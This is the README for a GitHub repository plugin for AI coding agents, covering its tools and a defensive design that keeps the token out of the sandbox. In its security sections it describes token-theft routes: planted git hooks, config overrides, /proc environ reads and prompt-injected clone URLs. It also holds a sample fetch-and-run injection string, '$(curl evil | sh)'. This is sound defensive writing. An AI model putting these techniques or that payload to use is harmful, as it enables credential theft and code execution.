# `@dynamicagents/plugins/repo-github`

Clone, commit, push a work branch, open a pull request — on GitHub.

Named for the provider, so a second forge is a `repo-*` sibling rather than a
fork of this one. What is generic keeps generic names: the factory is still
`repo()`, the tools are still `repo_clone` … `repo_pr_checks`, and the config
and result types are still `Repo*`. An agent installs one forge plugin, so
nothing the model reads has to change when the provider does.

```ts
import { repo, sandboxRepoGit } from "@dynamicagents/plugins/repo-github";
import { sandboxExec } from "@dynamicagents/plugins/sandbox";

repo({
  // Runs in the container, as the agent. Never given a credential.
  exec: sandboxExec({ binding: env.CODING_SANDBOX, sandboxName: () => name() }),
  // Clone, fetch and push: the container's git, presenting a placeholder the
  // sandbox's egress swaps for the token. See "Where the token lives" below.
  git: sandboxRepoGit(() => env.CODING_SANDBOX.getByName(name())),
  token: () => env.GITHUB_TOKEN
});
```

Tools: `repo_clone`, `repo_fetch`, `repo_status`, `repo_diff`, `repo_commit`,
`repo_push`, `repo_open_pr`, `repo_issue_view`, `repo_pr_view`, `repo_pr_comment`,
`repo_pr_threads`, `repo_pr_thread_reply`, `repo_pr_checks`, and — for a host that
keeps worktrees, below — `repo_worktrees` and `repo_worktree`.

`tools: [...]` offers only the tools named, and the context the model reads names
only those. An agent that coordinates others' work — reading pull requests, never
writing one — takes the read tools and nothing it would be told to finish with.
Core's `restrictTools` is the wrong instrument here: it drops a plugin's context
whole.

Everything past `repo_open_pr` is what a model reaches for `gh` to do — read an
issue, check a pull request, leave a comment, answer a review. They are here
rather than in the container because a _credentialed_ CLI there would hand its
token to the shell the model drives; an uncredentialed one can read a public
repository and nothing else. They resolve the repository from the checkout's own
origin, so they add no new model input to validate and no new way to point the
credential somewhere nobody asked about.

**Reading goes through GitHub's hosted MCP server; writing does not.** Every read
here — an issue, a pull request, its reviews, its review threads, its checks — is a
`tools/call` to `https://api.githubcopilot.com/mcp/readonly`, made from the Worker
with the deployment's token as `Authorization: Bearer`. The transport is
`@dynamicagents/core/mcp`'s, over the official `@modelcontextprotocol/client`;
`./mcp.ts` holds the endpoint and the `X-MCP-Tools` allowlist, which is two
read tools and is deliberately not something a host can widen.

Opening a pull request and commenting stay on REST, and answering a review thread
stays on GraphQL — `isResolved` aside, resolving a thread has no REST endpoint, and
the one MCP tool that offers it also submits reviews with `APPROVE`, which is a grant
this plugin declines. Those writes are per-install, not a route the read-only route
leaves open: an agent that must not write names none of them in `tools: [...]` above,
so the whole of what it can reach is the two read tools in the allowlist. The GraphQL
hazard worth knowing before editing `githubGraphql`:
**a failed query answers `200`**, with the errors in the body, so a caller that reads
`data` straight through reports a permission failure as success.

The same shape of hazard applies on the MCP route and is handled in `mcp.ts`: a tool
outside the allowlist comes back as a JSON-RPC error rather than an empty result, and
rendering one as "nothing there" would tell an agent a busy review is clean.

**github.com only.** GitHub Enterprise Server is not supported: the hosted MCP server
is github.com's, so there is no `apiBase` to point elsewhere. `allowedHosts` still
bounds _cloning_, which is generic git and works against any host — and because it
does, `githubRepo` refuses a checkout whose origin is on one of those other hosts
rather than resolving its `owner/repo`, which would name a different repository on
github.com and let a write reach it.

`repo_pr_thread_reply` is also the only tool here that takes something able to
name another repository: a thread id is a global node id, not a path segment
derived from the checkout. It asks which pull request the id belongs to and
refuses a mismatch, which is the same reach `githubRepo` denies everywhere else.

## The writes a recovered turn must not repeat

`repo_pr_comment` and `repo_pr_thread_reply` are Think **actions**, in the plugin's
`actions`, rather than tools. A turn cut by an eviction or a deploy is recovered by
running it again, and a comment that had already landed would land twice. An
action's result is kept under an idempotency key, and a call with a settled key
replays that result instead of calling GitHub.

The key is the task, the checkout and the pull request, and the write itself —
the body's SHA-256, and for a reply the thread and whether to resolve it. The task
is in it because a settled key replays for as long as Think keeps the row: without
it, the same comment in a later task would never post. A turn with no task id
refuses to key one at all.

Every failure is **thrown**, not returned: what an action returns is kept and
replayed, so a refusal returned as a sentence would answer every retry in the
task. A throw releases the key. The one outcome returned short of success is a
reply that landed on a thread that did not resolve — that reply must never be
sent again, and the resolve-only call it asks for is a different key.

`repo_open_pr` stays a tool: it looks for an open pull request on the branch before
it creates one, so a repeat finds the first. The rest are reads, or git
operations that are already safe to run twice.

## Worktrees a host keeps

A host whose writing sub-agents each commit in a checkout of their own can hand the
parent a way between them: `worktrees: { list, use, release }`. The plugin then
offers `repo_worktrees`, to see each worktree's branch and state and to release
one, and `repo_worktree`, which asks the host to point every repo tool at the
worktree holding a branch — or back at the main checkout. The switch holds until
the next one, and a host that moves the tools on its own says so where the model
reads it every turn: the model remembers the switch's answer. A switch moves the
installing agent's own tools, so a host passes `worktrees` to the parent's install
and never to a sub-agent's. The host renders every answer; this plugin checks a
branch's shape and passes the sentence through.

## Nothing is held for approval

No tool or action here asks for approval, opening a pull request included. A pull
request is the point of the work, it lands on a branch, and it is reviewable after
the fact — so stopping a turn to ask about one buys nothing that the review itself
does not.

That is a judgement about these calls, not a limitation of the plugin contract. A
fork that wants a gate has its agent ask first, through core's `ask_user`.

Two injected dependencies, and the line between them is the trust boundary rather
than a matter of taste. `exec` is anything that runs a command in the container —
[`/sandbox`](../sandbox/)'s `sandboxExec` is one such thing, and injecting it
keeps the two plugins independent, so a host with its own container can use this
against that and the tests here need no container at all. `git` is the other side:
the three operations that talk to GitHub, with the credential never inside the
container. See below for why that split exists.

## Where the token lives

Not in the container. Not for a moment, not in one command, not in one process's
environment.

`clone`, `fetch` and `push` — the three operations that authenticate — go to the
injected `git`. Over a `/sandbox` object they run in the container, as
`sandboxRepoGit`, and the token still never enters it. The sandbox carries
`githubSandboxEgress`: the
harness intercepts `github.com`, git presents a placeholder, and the egress — a Worker
entrypoint, outside the container — swaps the token in. Every process in the
container can present the placeholder, so the egress holds every credentialed push to
what `repo_push` would: no tag, no protected name, and never the repository's default
branch, which it reads from GitHub with the token. The refs are read from the request
before GitHub sees it. A `push` policy narrows that further, to named repositories
and branches, for a sandbox that knows them. A planted hook reads only the
placeholder, and can do with it only what those rules allow.

Everything else still runs in the container through `exec`, because none of it needs
to authenticate: `status`, `diff`, `add`, `commit`, `checkout`. That is the whole
rule for changing this plugin — an operation that talks to GitHub does not belong
on `exec`, and one that does not has no business anywhere else.

One exception runs the other way, for cost rather than trust: a host's `git` may
also answer `origin(dir)` from its own copy of the files. The GitHub tools then
resolve their repository without the container, so an agent polling a pull request
for its review does not keep one running.

The rule is absolute rather than careful because the narrower versions do not hold.
Git is a general-purpose command runner: it executes what `.git/config` and
`.git/hooks` name, both live in the checkout, and a co-installed shell
tool can write them — so a planted `pre-push` hook reads the token straight out of
the environment an ordinary `repo_push` gives it. Patching that key by key fails
too, because a URL-specific `http.<url>.sslVerify=false` in the repository's own
config beats a `-c` override: specificity outranks precedence. And a token that
lives in a process environment for the length of one command is readable at
`/proc/<pid>/environ` by any other process running as the same user.

Two more rules, about GitHub rather than the container:

- **Never offered to a host you did not allow.** The clone URL is model input: a
  repository README, an issue body, or a page a co-installed browser plugin fetched
  is enough to choose it. So the URL's host must be on `allowedHosts` (default:
  `github.com`) before anything runs at all, and the allowlist travels with every
  call so the host can bind the check to the moment the credential would actually be
  handed over — which is also the only check that sees a host arrived at by
  redirect. A URL carrying userinfo or a port is refused outright: both travel on to
  the host's git, and userinfo is where URL parsers disagree about which host is
  named. `origin` is re-derived and re-checked on every push rather than remembered,
  because the checkout's `.git/config` is a file the container can rewrite.
- **The GitHub API is called from the Worker.** So the credential that can write
  through the API never crosses into the container either. Every tool that uses it —
  `repo_open_pr`, `repo_issue_view`, `repo_pr_view`, `repo_pr_comment` — resolves
  the repository from the **checkout's own origin** rather than from a parameter.
  That is deliberate and it matters most for `repo_open_pr`, the one that writes: a
  repository named at the call site would be bounded only by the host allowlist, so
  an agent talked into naming one could open a pull request on anything the token
  can write to.

Model-authored values — URLs, branch names, commit messages — reach the container as
environment variables rather than being interpolated into a command, so a branch
name of `$(curl evil | sh)` is inert text. That is about shell injection rather than
credentials, and it is independent of all of the above.

What remains is not zero, and is worth naming precisely:

- **The token's reach is the token's own.** This plugin checks the _host_ a clone or
  push may target, never the repository — so whatever the credential can read or
  write, an agent talked into naming it can reach. That is deliberate: a repository
  allowlist here would block legitimate work like filing a pull request against a
  dependency. It does mean the `GITHUB_TOKEN` should be fine-grained and scoped to
  what the agent is actually for, because nothing below it will narrow it further.
- **The host is trusted with the credential**, which is the point, but it moves the
  question rather than deleting it. A host that implements `git` by shelling out
  inside the container with the real token has undone all of the above, and this
  plugin cannot tell.

## Guardrails are in the tool, not the prompt

`repo_push` refuses, before running anything, in three layers — a guardrail a
model can talk itself out of is not a guardrail:

1. **Anything that is not a plain branch name.** `git push origin <name>` reads
   `<name>` as a _refspec_, so `+x:main` is a force push to main and `x:main` an
   ordinary one — neither of which a list of forbidden names ever sees, because
   it only compares literal strings.
2. **`main`, `master`, `trunk`, `develop`.**
3. **The repository's own default branch**, read from the remote. A repo whose
   trunk is `release` deserves the same protection, and only the remote can say.

It then refuses a fourth thing: **a branch that adds no commit the remote does not
already have.** Pushing one succeeds, `repo_open_pr` fails or opens an empty pull
request, and the work looks delivered — the one outcome worse than an error. It
is measured against every branch on the remote, not the default one, because a
pull request's base need not be the default: a branch level with `next` is empty
against `next` and still ahead of `main`. It is checked before a missing branch
is created, and when the host keeps worktrees the refusal carries its list, which
is where a writing sub-agent's work is.

`repo_push` **switches to** an existing branch and only creates a missing one —
`checkout -b`, never `-B`. `-B` is create-or-_reset_, so on a branch that already
holds the commit it force-moves it to wherever HEAD is now: the commit survives
only as an unreferenced object, and what gets pushed is an empty branch with a pull
request opened on it.

`repo_clone` is re-entrant, because a container that outlives its task comes back
with the checkout still in it. It fetches and resets a clean one, and **refuses a
dirty one** rather than resetting over the top: those changes are an earlier task's
work, and discarding them is the one outcome nobody can undo. A checkout is matched
by repository rather than by the exact URL string, so `.../o/r`, `.../o/r.git` and
`.../o/r/` all recognise the tree that is there.

**A clone's answer also lists the skills the checkout carries**, from
`.claude/skills/*/SKILL.md`, with each one's name, a clipped description, and how a
prompt may reach it. That last part is the half that is not decoration: a skill whose
frontmatter sets `disable-model-invocation` is refused to a model's own skill tool, so
naming it as `/<name>` is the only way in, while `user-invocable: false` removes that
command and leaves prose. A host that cannot tell those apart writes a prompt that
silently does nothing. The list is capped and each description clipped, and the answer
carries the total, how many it listed and how many it left out; a checkout with none says
so, because "none here" and "this tool does not report them" are different facts. A read
that fails costs the inventory and never the clone. `./skills.ts` holds the parsing and
the bounds, and what it does **not** hold is when a skill should be named: that is the
policy of whichever host writes the prompt.

It also refuses a URL that names no repository — `.../tree/main`, `.../pull/4`,
what a model copies out of a browser. Cloning one anyway means never telling
`beforeCheckout` which repository this is, so a host keying its filesystem per
repository never switches and the checkout lands in whichever one was already open.
The refusal says what to send instead, which costs a turn and no guessing.

## When the container is not there

`exec` does not only return failures, it throws them: `@cloudflare/computer` throws
when a container is replaced mid-command, and a Durable Object call can fail
outright. None of that reaches the model as a tool error — it is caught where the
command is run and comes back through each tool's own failure sentence, so
`repo_status` says it could not read the status and `repo_push` says the push did
not go, each carrying what a replaced container actually means: nothing finished,
the checkout is durable and untouched, and retrying is safe because these commands
push one branch to the branch of the same name and never force.

The distinction that costs something if you get it wrong is between a command
that **answered no** and one that **never ran**. Three places here read a failure
as an answer — "no checkout in this directory", "no such branch", "no default
branch to protect" — and a container that vanished must not be read as any of
them. A replaced container is exactly the case where the next command lands on a
working replacement, so a probe misread as "empty directory" would send `git
clone` at a checkout that is already there.

## Output is bounded

Every tool truncates from the middle at `maxOutputChars` (16,000 characters by
default), the
same way `/computer`'s `bash` does. `repo_diff` also takes `stat: true` for a per-file
changed-line summary — the right first call on a large change, and the only
practical one for an agent whose entire view of the work is the diff.

## Requirements

A `GITHUB_TOKEN` secret with contents + pull-request write (and checks + commit
statuses read, for `repo_pr_checks`), a container with
`git` on it for the local half, and a `git` implementation on the host's side for
the three operations that authenticate.
